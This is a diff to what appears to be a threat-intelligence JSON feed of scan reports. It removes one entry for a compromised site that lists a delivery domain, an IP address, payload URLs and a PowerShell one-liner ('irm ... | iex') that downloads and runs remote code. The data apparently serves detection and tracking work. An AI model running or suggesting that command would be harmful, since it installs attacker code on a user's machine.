@@ -6922,31 +6922,5 @@
     ],
     "ReportId": "cmwb5cxvo00mr0nmly0i3xbks",
     "ScannedAt": "2026-11-10T20:32:54.395000+00:00"
-  },
-  {
-    "UrlDomain": "www.robertoscalco.it",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.109.47"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/de245c5f07077b06",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905654",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/de245c5f07077b06'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/de245c5f07077b06"
-    ],
-    "ReportId": "cmwb3aant00gt0nmlmc5pa0pm",
-    "ScannedAt": "2026-11-10T19:34:51.772000+00:00"
   }
 ]
